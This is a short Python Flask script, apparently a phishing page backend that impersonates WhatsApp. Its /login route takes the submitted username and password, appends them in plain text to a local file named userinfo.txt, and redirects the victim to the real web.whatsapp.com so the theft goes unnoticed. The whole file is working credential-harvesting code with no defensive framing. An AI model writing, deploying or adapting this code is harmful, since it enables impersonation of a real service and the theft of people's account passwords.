from flask import Flask, request, redirect, render_template

app = Flask("whatsapp")

@app.route("/")
def index():
    return render_template("index.html")

@app.route('/login', methods=["POST"])
def login():
    username = request.form['username']
    password = request.form['password']
    with open("userinfo.txt", 'a') as f:
        f.write(f"username: {username},  password:{password}")
    return redirect("https://web.whatsapp.com")


app.run(debug=True)